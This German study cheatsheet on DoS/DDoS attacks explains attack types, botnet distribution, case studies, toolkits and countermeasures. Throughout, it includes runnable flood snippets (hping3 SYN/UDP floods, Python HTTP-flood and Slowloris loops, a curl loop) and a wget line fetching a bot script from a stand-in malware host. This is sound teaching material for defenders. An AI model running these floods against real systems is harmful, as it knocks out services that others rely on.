
# 🛡️ Cheatsheet: Chapter 10 – DoS / DDoS Attacks

## 🔍 Grundlagen

| Begriff | Beschreibung |
|--------|--------------|
| **DoS** | Denial-of-Service – Angriff auf Verfügbarkeit eines Systems oder Dienstes durch Ressourcenüberlastung. Beispiel: Ein Server erhält zu viele Anfragen und stürzt ab. |
| **DDoS** | Distributed DoS – dieselbe Wirkung durch verteilte Systeme (z. B. Botnet). |
| **Botnet** | Netzwerk kompromittierter Geräte (Zombies), zentral gesteuert über C&C (Command & Control). |
| **Ziel** | Verfügbarkeit blockieren, Netzwerk oder Dienste unbrauchbar machen. |

```bash
# Beispiel: Einfache SYN Flood mit hping3
hping3 -S -p 80 --flood <Ziel-IP>
```

---

## 🧠 Typen von DoS/DDoS-Angriffen

### 📶 Volumetric Attacks (bps)

Ziel: Bandbreite überfluten. Nutzt meist UDP-basierte Protokolle wie DNS oder NTP.

```bash
# NTP Amplification via monlist (Nmap)
nmap -sU -pU:123 -Pn -n --script=ntp-monlist <target>
```

### ⚙️ Protocol Attacks (pps / cps)

Ziel: Ressourcen wie Verbindungsstatus-Tabellen erschöpfen.

```bash
# Beispiel: SYN-Flood mit hping3
hping3 -S -p 443 --flood <Ziel-IP>
```

### 🧩 Application Layer Attacks (rps)

Ziel: Anwendungen oder Dienste durch gezielte HTTP-Requests lahmlegen.

```python
# Beispiel: HTTP Flood mit Python
import requests
while True:
    requests.get("http://zielseite.com")
```

---

## 🕸️ Botnet-Funktionalität

| Verwendungszweck | Beschreibung |
|------------------|--------------|
| DDoS | Ressourcenüberlastung durch koordinierte Anfragen |
| Spam | SOCKS-Proxy zum Versand von Massen-E-Mails |
| Sniffing | Datenverkehr mitschneiden (z. B. Passwörter) |
| Keylogging | Tastatureingaben speichern |
| Mining | Krypto-Mining auf infizierten Geräten |

---

## 🔍 Scanning-Methoden

| Methode | Beschreibung |
|--------|--------------|
| **Random Scanning** | Zufällige IP-Adressbereiche prüfen |
| **Hit-list Scanning** | Vorgefertigte Ziel-Liste nutzen |
| **Topological Scanning** | Links/Dateien auf kompromittierten Hosts auswerten |
| **Permutation Scanning** | Koordinierte Verteilung durch gemeinsame Permutationslisten |

---

## 🔁 Schadcode-Verbreitung

- **Central Source**: Zentraler Server verteilt Toolkit
- **Back-Chaining**: Infizierter Host fordert Dateien an
- **Autonomous**: Infektion direkt beim Angriff

| Methode           | Erklärung                                                                                   | Beispiel                                                                 |
|-------------------|---------------------------------------------------------------------------------------------|--------------------------------------------------------------------------|
| **Central Source** | Angreifer nutzt zentralen Server (z. B. HTTP/FTP), von dem das Toolkit heruntergeladen wird. | `wget http://malware.example.com/bot.sh` lädt das Toolkit herunter.     |
| **Back-Chaining** | Infiziertes Zielsystem stellt Verbindung zum Angreifer her, um sich aktiv das Toolkit zu holen. | `TFTP` oder `netcat` ruft Payload vom Angreifer-Host ab.                |
| **Autonomous**     | Infizierter Host enthält den Code bereits und verbreitet ihn selbständig weiter.             | Wurm nutzt SMB oder RCE zur Weiterverbreitung im lokalen Netzwerk.      |


| Kriterium                 | Central Source | Back-Chaining | Autonomous     |
|---------------------------|----------------|----------------|----------------|
| **Verteilungslogik**      | Vom Server zum Opfer | Opfer lädt beim Angreifer herunter | Opfer überträgt selbst |
| **Abhängigkeit vom Angreifer** | Hoch           | Mittel         | Gering         |
| **Firewall-Bypass möglich?** | Nein           | Ja (ausgehend) | Ja (intern)    |
| **Typische Protokolle**   | HTTP, FTP, SMB  | TFTP, Netcat   | SMB, RPC, RCE  |


---

## 📚 Case Studies

### Google Cloud (2023)
- HTTP/2 Rapid Reset
- 398 Mio RPS
- CVE-2023-44487
- Mitigation durch Zusammenarbeit der Industrie

## 🧪 Case Studies im Überblick

### 📌 Case Study 1: HOIC-Kampagne mit Freiwilligen

**Beschreibung:**  
Angreifer nutzen das frei verfügbare Tool **HOIC (High Orbit Ion Cannon)** und mobilisieren über soziale Netzwerke **Freiwillige**, die an einem koordinierten Layer-7-DDoS teilnehmen.

**Ablauf:**
1. Bereitstellung des Tools über SourceForge oder kompromittierte Webseiten.
2. Werbung für das Tool über Twitter, Facebook, Google-Suchergebnisse.
3. Koordination der Teilnehmer über IRC (z. B. Anonymitätsnetzwerke).
4. Start des Angriffs auf ein Ziel wie PayPal oder Mastercard.

**Merkmale:**
- Kein Botnet erforderlich – menschliche Teilnehmer werden instrumentalisiert.
- Häufig politisch oder aktivistisch motiviert.
- Verwendet HTTP-Flood, verursacht Dienstunterbrechungen.

---

### 📌 Case Study 2: Google Cloud – HTTP/2 Rapid Reset DDoS (2023)

**Beschreibung:**  
Im Spätsommer 2023 wurde Google Opfer eines extrem skalierbaren DDoS-Angriffs, bei dem eine neue Technik namens **HTTP/2 “Rapid Reset”** eingesetzt wurde.

**Technische Details:**
- **398 Millionen Requests pro Sekunde (RPS)** – Rekordwert.
- Ausnutzung von HTTP/2-Multiplexing und sofortigem Verbindungsabbruch (RST).
- TCP-Sitzungen wurden massenhaft aufgebaut und abgebrochen, ohne echte Last zu erzeugen.

**Ablauf:**
1. Angreifer startet Session-Floods über wenige TCP-Verbindungen.
2. HTTP/2 erlaubt bis zu 100 gleichzeitige Streams → alle werden sofort resettet.
3. Zielsysteme kollabieren unter dem Verwaltungsaufwand der Sessions.

**Gegenmaßnahmen:**
- Google nutzte seine globale Edge-Infrastruktur zur Abwehr.
- Sofortige Weitergabe von Threat Intelligence an andere Anbieter.
- Protokoll-Updates + Veröffentlichung als **CVE-2023-44487** (CVSS 7.5).

---

### 🔄 Vergleich: HOIC vs. Google-Angriff

| Merkmal             | HOIC-Kampagne                       | Google Rapid Reset Angriff                  |
|---------------------|-------------------------------------|---------------------------------------------|
| **Angriffstyp**     | HTTP-Flood via GUI-Tool             | Protokollausnutzung (HTTP/2 Layer-7 Reset)  |
| **Teilnehmer**      | Freiwillige Nutzer                  | Automatismus/Botnet                         |
| **Tool**            | HOIC                                | Custom HTTP/2-Reset Engine                  |
| **Ziel**            | Politisch motivierte Ziele (z. B. PayPal) | Großinfrastruktur (Google, Cloud Services)  |
| **Schutzmaßnahmen** | IP-Block, Rate Limit, CDN           | Protokoll-Update, globale Kooperation       |
| **Nachverfolgbarkeit** | Hoch (Freiwillige sichtbar)      | Gering (Sessions legitim, schwer rückverfolgbar) |


---

## ⚔️ Bekannte Techniken

- UDP / ICMP / SYN / ACK Flood
- Ping of Death / Smurf / NTP Amplification
- HTTP GET/POST Flood
- Slowloris, PDoS, DRDoS
- Zero-Day Exploits

---

## 🧰 Tools

| Tool | Zweck |
|------|-------|
| HOIC/LOIC | Layer-7-DDoS |
| hping3 | SYN Flood |
| Nmap | Netzwerkscan |
| SYN Cookies | Schutzmaßnahme gegen SYN Floods |

---

## 🛡️ Schutzmaßnahmen

- IDS/IPS und Anomalieerkennung
- Paketfilter, Firewall, GeoIP-Blocking
- NTP-Server absichern (`monlist` deaktivieren)
- TCP-Stack optimieren (SYN-Cookies, Timeout)
- Zero Trust Architektur

---


### 🧩 Layer-7: HTTP GET/POST Attack

**Beschreibung:**  
Layer-7-Angriffe zielen auf die Anwendungsebene (z. B. HTTP). Dabei werden legitime Protokollmechanismen ausgenutzt, um Ressourcen auf Servern zu blockieren.

| Methode | Erklärung |
|--------|-----------|
| **HTTP GET Attack** | Der Angreifer öffnet eine Verbindung und verzögert die Header-Übertragung → Server hält Verbindung offen |
| **HTTP POST Attack** | Der Angreifer sendet Header vollständig, aber kein Body → Server wartet auf vollständige Nachricht |

**Eigenschaften:**  
- Schwer zu erkennen (kein Spoofing, keine fehlerhaften Pakete)
- Geringe Bandbreite nötig
- Ziel: Ressourcenbindung auf Applikationsebene

```python
# Beispiel: Verzögerte GET-Anfrage mit Python
import socket, time
s = socket.socket()
s.connect(("example.com", 80))
s.send(b"GET / HTTP/1.1\r\nHost: example.com\r\n")
time.sleep(60)  # Header bleibt unvollständig
```

### 🧩 Erweiterte HTTP Flood Angriffe

Neben klassischen GET/POST-Angriffen existieren weitere Varianten, die auf HTTP-Ebene (Layer 7) ausgeführt werden:

| Angriffstyp | Beschreibung |
|-------------|--------------|
| **Single-Session HTTP Flood** | Mehrere Anfragen innerhalb einer HTTP/1.1-Verbindung (Keep-Alive) zur Ressourcenüberlastung. |
| **Single-Request HTTP Flood** | Mehrere versteckte HTTP-Requests innerhalb eines einzelnen Pakets, um Firewalls zu umgehen. |
| **Recursive HTTP GET Flood** | Der Angreifer imitiert legitimes Surfen (z. B. Bilder und Unterseiten), um als Benutzer zu erscheinen. |
| **Random Recursive GET Flood** | Erweiterte Version für Foren/Blogs – Zugriff auf zufällige Seiten zur Tarnung als echter Nutzer. |

```python
# Beispiel: Simulierter GET-Loop über zufällige Seiten
import requests, random
base_url = "http://target-site.com/page?id="
for _ in range(100):
    page = random.randint(1, 1000)
    requests.get(base_url + str(page))
```
Diese Angriffe zielen darauf ab, HTTP-basierte Anwendungen wie Webserver oder CMS-Systeme (z. B. WordPress, phpBB) durch hohe Anfragelast zu stören.

### 🐢 Slowloris Attack

**Beschreibung:**  
Slowloris ist ein Layer-7 DDoS-Tool, das durch partielle HTTP-Anfragen Serverressourcen blockiert. Jeder Request sieht gültig aus, wird aber nie abgeschlossen. Der Webserver wartet auf die vollständigen Anfragen und hält alle Verbindungen offen.

**Funktionsweise:**  
- Sendet unvollständige Header mit langen Pausen
- Keine fehlerhaften Pakete → schwer zu erkennen
- Ziel: Ausschöpfung des Verbindungspools

```bash
# Beispiel: Slowloris-Angriff mit Python (vereinfachte Darstellung)
import socket, time
s = socket.socket()
s.connect(("zielseite.com", 80))
s.send(b"GET / HTTP/1.1\r\n")
while True:
    s.send(b"X-a: b\r\n")
    time.sleep(10)
```

**Tool:**  
- [`slowloris`](https://github.com/gkbrk/slowloris) – Open Source CLI Tool

### 💥 UDP Application Layer Flood Attack

**Beschreibung:**  
Obwohl UDP-Floods primär als Volumenangriffe gelten, existieren auch application-layer-basierte UDP-Protokolle, die gezielt missbraucht werden können. Diese Protokolle erwarten keine Verbindung und sind somit leicht floodbar.

**Beispiele für betroffene UDP-basierte Protokolle:**

- **CHARGEN** (Character Generator Protocol)
- **SNMPv2** (Simple Network Management Protocol)
- **QOTD** (Quote of the Day)
- **RPC** (Remote Procedure Call)
- **SSDP** (Simple Service Discovery Protocol)
- **CLDAP** (Connection-less LDAP)
- **TFTP** (Trivial File Transfer Protocol)
- **NetBIOS**
- **NTP** (Network Time Protocol)
- **Quake/Steam Protocols** (Gaming)
- **VoIP** (z. B. SIP over UDP)

**Hinweis:** Viele dieser Protokolle besitzen keinen Mechanismus zur Überlastkontrolle und sind daher anfällig für Amplification oder direkte Flooding-Angriffe.

```bash
# Beispiel: SSDP-Flood mit hping3 (nur zu Testzwecken)
hping3 --udp -p 1900 --flood <Ziel-IP>
```

### 🧨 Multi-Vector Attack

**Beschreibung:**  
Bei Multi-Vector-DDoS-Angriffen kombiniert der Angreifer verschiedene Angriffstypen (Volumetric, Protocol, Application Layer), um gezielt Schwachstellen in unterschiedlichen Schichten auszunutzen.

**Merkmale:**
- Schneller Wechsel zwischen SYN Flood, HTTP Flood usw.
- Parallel laufende Angriffsformen → erschwerte Erkennung und Reaktion
- Ziel: Überlastung technischer Ressourcen und Verwirrung des Incident-Response-Teams

**Beispiel-Szenario:**
1. Start mit UDP-Flood (Volumetric)
2. Übergang zu SYN-Flood (Protocol)
3. Abschluss durch Slowloris (Application Layer)

```bash
# Beispielhafte Tools für Multi-Vector Tests:
sudo hping3 -S -p 80 --flood <Ziel-IP>     # SYN Flood
while true; do curl http://<Ziel-IP>; done # HTTP Flood
```

**Gegenmaßnahmen:**
- Traffic-Analyse auf verschiedenen Ebenen
- Kombination aus IDS, WAF und Anti-DDoS Cloud-Diensten
- Frühzeitige Erkennung von Angriffswechseln durch Threat Intelligence

### 🔄 Peer-to-Peer Attack

**Beschreibung:**  
Bei Peer-to-Peer (P2P) DDoS-Angriffen nutzt der Angreifer Schwachstellen in P2P-Protokollen wie **Direct Connect (DC++)**, um legitime Clients zu missbrauchen. Diese Art von Angriff kommt ohne klassische Botnets aus.

**Funktionsweise:**
- P2P-Clients werden angewiesen, sich statt mit der Filesharing-Plattform mit dem Opfer-Server zu verbinden.
- Tausende Clients versuchen daraufhin gleichzeitig, HTTP-Verbindungen zum Opfer aufzubauen → Ressourcenüberlastung.

**Merkmale:**
- Keine Command-and-Control-Kommunikation nötig
- Nutzt bekannte Protokoll-Fehler in Messaging- und Filesharing-Software
- Verbindungsversuche erscheinen zunächst legitim

```bash
# Beispielhafte Maßnahmen zur Erkennung:
sudo netstat -an | grep :80
# ungewöhnlich viele gleichzeitige Client-Verbindungen aus P2P-Ranges
```

**Gegenmaßnahmen:**
- Einschränkung von P2P-Datenverkehr auf Port 80 (z. B. durch Firewall)
- Signaturbasierte IDS zur Erkennung bekannter Muster
- Protokollvalidierung auf Netzwerk-Gateway-Ebene

### 🧱 Permanent Denial-of-Service Attack (PDoS / Phlashing)

**Beschreibung:**  
PDoS-Angriffe zielen nicht auf Software oder Netzwerke, sondern direkt auf die **Hardware**. Sie führen zu **dauerhaften Schäden**, die meist nur durch physische Reparatur oder Austausch zu beheben sind.

**Funktionsweise:**
- Angreifer manipulieren Firmware-Updates oder nutzen Schwachstellen in Management-Interfaces (z. B. auf Routern, Druckern)
- Ziel ist das sog. **Bricking**: das Gerät wird durch ein fehlerhaftes Update unbrauchbar

**Verbreitung:**
- Über **E-Mails**, **IRC-Chats**, **Fake-Treiber**, **YouTube-Videos** oder **Social Media-Links**
- Opfer werden dazu verleitet, schadhafte Firmware-Updates zu installieren

**Beispiel:**
```plaintext
Angreifer erstellt gefälschte Firmware für Router-Modell X
Verbreitet Link über YouTube-Kommentar mit "neuem Sicherheitsupdate"
Opfer lädt Datei herunter und "flasht" Router → Hardware defekt
```

**Gegenmaßnahmen:**
- Nur signierte Firmware von offiziellen Quellen akzeptieren
- Management-Schnittstellen absichern (VPN, 2FA, ACLs)
- Geräte regelmäßig auf Integrität prüfen (Secure Boot, TPM)

### ⚠️ TCP SACK Panic Attack

**Beschreibung:**  
Die TCP SACK Panic Attack ist ein Remote-Angriff, der gezielt auf **Linux-Kernel**-Systeme zielt und einen **Kernel Panic** (Systemabsturz) verursacht. Die Attacke nutzt eine Integer-Overflow-Schwachstelle in der Socket Buffer-Verwaltung (SKB).

**Funktionsweise:**
- TCP Selective Acknowledgment (SACK) informiert den Sender über empfangene Pakete
- Linux speichert TCP-Segmente im **socket buffer** (max. 17 Segmente)
- Angreifer sendet speziell gestaltete SACK-Pakete mit **niedrigem MSS-Wert** (z. B. 48 Bytes)
- Dies zwingt das System, viele kleine Segmente zu verwalten
- **→ Segmentanzahl überschreitet Limit → Integer Overflow → Kernel Panic**

**Betroffene Systeme:**
- Linux-Kernel (auch Container & VMs betroffen)
- Besonders problematisch bei Cloud-Infrastrukturen

**Codebeispiel (Proof of Concept):**
> Aus Sicherheitsgründen nicht veröffentlicht – bekannt unter CVE-2019-11477 („SACK Panic“)

**Gegenmaßnahmen:**
- Linux-Kernel patchen (ab Juli 2019 verfügbar)
- TCP SACK in kritischen Systemen deaktivieren (nur wenn möglich)
- IDS/Firewall-Regeln zur Erkennung von SACK-Manipulation

### 🔁 Distributed Reflection Denial-of-Service (DRDoS) Attack

**Beschreibung:**  
Ein DRDoS-Angriff (auch "Spoofed Reflection Attack") nutzt legitime Server (Reflektoren), um ein Ziel mit Antworten zu überfluten – basierend auf gefälschten Anfragen, die scheinbar vom Opfer stammen.

**Ablauf:**
1. Angreifer nutzt kompromittierte Zombies, um **SYN-Pakete mit gespoofter Absenderadresse** (Ziel-IP) an Reflektoren zu senden
2. Reflektoren antworten mit **SYN/ACK** an das Opfer, da sie eine Verbindung erwarten
3. Opfer ignoriert die Pakete (hat nie einen SYN gesendet), Reflektoren versuchen mehrfach erneut (Retransmissions)
4. Die gebündelte Antwortlast überfordert das Zielsystem

**Struktur:**
- **Primärer Angreifer**
- **Zombies (intermediäre Opfer)** – erzeugen initialen Datenstrom
- **Reflektoren (sekundäre Opfer)** – antworten irrtümlich an das Ziel
- **Primäres Ziel** – empfängt Flut an Antworten

**Merkmale:**
- Schwer rückverfolgbar (IP-Spoofing + legitime Server antworten)
- Effektiver als direkter DDoS-Angriff
- Besonders gefährlich in Kombination mit Amplification (z. B. DNS, NTP)

```bash
# Beispielhafter UDP-Reflection-Scan mit Nmap
nmap -sU --script=ntp-monlist -p 123 <reflector-IP>
```

**Gegenmaßnahmen:**
- IP-Spoofing-Prävention (BCP38 / ingress filtering)
- Reflektoren härten (z. B. DNS Recursion deaktivieren, NTP `monlist` abschalten)
- Traffic-Shaping und Anti-DDoS-CDN-Dienste einsetzen

### 💸 DDoS Extortion / Ransom DDoS (RDDoS) Attack

**Beschreibung:**  
Bei einem Ransom DDoS (RDDoS) droht der Angreifer einer Organisation mit einem DDoS-Angriff, falls kein Lösegeld gezahlt wird. Oft wird ein **kurzer DDoS-Angriff als "Probe"** gestartet, um die Glaubwürdigkeit der Drohung zu erhöhen.

**Ablauf:**
1. Kurzer Probeangriff oder Angabe angeblicher Schwachstellen
2. Versand einer **Erpressungsnachricht** per E-Mail, oft mit:
   - Höhe des Lösegelds (z. B. in Bitcoin)
   - Deadline für Zahlung
   - Androhung eines massiven Angriffs bei Nichtzahlung

**Ziele:**
- Große E-Commerce-Sites
- Finanzdienstleister
- SaaS-Anbieter und öffentliche Infrastruktur

**Beispiel für Lösegeldnachricht (verkürzt):**
> "Wir werden Ihr gesamtes Online-Angebot 72 Stunden lang unbrauchbar machen, wenn Sie nicht 2 BTC an folgende Adresse zahlen..."

**Merkmale:**
- In vielen Fällen nur Fake-Drohungen
- Ziel ist psychologischer Druck → Zahlung ohne tatsächlichen Angriff

**Gegenmaßnahmen:**
- Keine Zahlung an Erpresser (bestärkt Nachahmer)
- Vorbereitung auf DDoS (Notfallpläne, Cloud-Protection, Redundanz)
- Bedrohung ernst nehmen, aber rational bleiben
- Sicherheitsbehörden informieren

```plaintext
Wichtig: Auch wenn keine DDoS-Funktionalität gezeigt wird, ist die Bedrohung reputations- und geschäftsschädigend!
```

### 🧰 DoS/DDoS Attack Toolkits – Beispiel: ISB (I'm So Bored)

**Quelle:** [ISB auf SourceForge](https://sourceforge.net/projects/isbddos/)

**Beschreibung:**  
**ISB ("I'm So Bored")** ist ein einfaches DDoS-Toolkit, das für **UDP-, TCP-, HTTP- und ICMP-Flooding** eingesetzt werden kann. Es richtet sich eher an unerfahrene Angreifer (Script Kiddies), bietet aber dennoch effektive Funktionen zur Durchführung von DoS-Angriffen.

**Funktionen:**
- Start von DDoS-Angriffen mit einem Klick
- Unterstützt mehrere Protokolle (HTTP, UDP, TCP, ICMP)
- Tools zur Zielaufklärung integriert:
  - **WHOIS**
  - **netstat**
  - **traceroute**
  - **ping**

**Beispielhafte Nutzung:**
```plaintext
Angreifer verwendet ISB:
1. Ping-Scan und Traceroute zur Zielerkennung
2. UDP-Flood an Port 80 starten
3. ICMP-Flood ergänzen, um Monitoring zu umgehen
```

**Risiko:**  
Diese Art von Toolkits senkt die Einstiegshürde für Cyberkriminalität erheblich und wird oft in Schulen oder Amateurkreisen verwendet.

**Gegenmaßnahmen:**
- Deep Packet Inspection (DPI) gegen anomale Muster
- Rate Limiting bei UDP/ICMP
- Signaturbasiertes Erkennen in IDS/IPS-Systemen

### 🧰 DoS/DDoS Toolkits – Beispiel: UltraDDOS-v2

**Quelle:** [UltraDDOS-v2 auf SourceForge](https://sourceforge.net/projects/ultraddos/)

**Beschreibung:**  
**UltraDDOS-v2** ist ein grafisches DDoS-Werkzeug, das für **Flood-Angriffe auf Webseiten und Server** entwickelt wurde. Es bietet eine **einfache grafische Oberfläche (GUI)**, wodurch es auch von technisch weniger versierten Angreifern genutzt werden kann.

**Funktionen:**
- Eingabe von Ziel-IP, Port und Anzahl der Pakete über GUI
- Unterstützung für große Mengen an UDP-/TCP-Paketen
- Schnelle Auslösung von Floods per Knopfdruck

**Typischer Ablauf:**
1. Angreifer öffnet GUI
2. Trägt Ziel-IP, Port (z. B. 80) und Paketanzahl ein
3. Klick auf „Start“ → Server wird geflutet

```plaintext
Ziel: www.beispielziel.de
Port: 80
Pakete: 1.000.000
```

**Risiko:**  
Aufgrund der niedrigen Einstiegshürde ist das Tool beliebt für spontane Angriffe, z. B. aus Online-Foren heraus.

**Gegenmaßnahmen:**
- Erkennung ungewöhnlicher Verbindungsraten (Rate Limiting)
- Geo-Blocking oder Access-Control-Listen für bekannte Missbrauchsregionen
- Web Application Firewall (WAF) aktivieren

### 🛠️ Weitere DoS/DDoS-Angriffstools

**Folgende Tools sind häufig im Umlauf und werden aktiv für DoS/DDoS-Angriffe genutzt:**

| Tool | Beschreibung | Quelle |
|------|--------------|--------|
| **HOIC** (High Orbit Ion Cannon) | Layer-7 HTTP-Flooder mit „booster“-Support (Plugin-Erweiterung) | [SourceForge](https://sourceforge.net/projects/hoic/) |
| **LOIC** (Low Orbit Ion Cannon) | Eines der bekanntesten Tools für UDP-/TCP-/HTTP-Floods | [SourceForge](https://sourceforge.net/projects/loic/) |
| **HULK** (HTTP Unbearable Load King) | Generiert zufällige und variable HTTP-GET-Anfragen zur Umgehung von Caching-Mechanismen | [GitHub](https://github.com/grafov/hulk) |
| **Slowloris** | Verursacht Auslastung durch langsames Senden unvollständiger HTTP-Header | [GitHub](https://github.com/gkbrk/slowloris) |
| **UFONet** | Tool für DDoS über Botnet/IoT-Geräte, inkl. Reflection-Techniken | [UFONet](https://ufonet.03c8.net) |
| **Packet Flooder Tool** | Kommerzielles Windows-Tool zur Durchführung von Paketfluten | [NetScanTools](https://www.netscantools.com/nstpro_packetflooder.html) |

**Hinweis:**  
Viele dieser Tools werden auch in Skript-Kiddie-Kreisen verwendet. Besonders kritisch ist die Möglichkeit zur schnellen Organisation von Flash-Mobs (z. B. über Discord, Telegram).

**Beispielhafte Schutzmaßnahmen:**
- IP-Ratenbegrenzung
- Web Application Firewall (WAF)
- Schutz über Content Delivery Network (CDN)
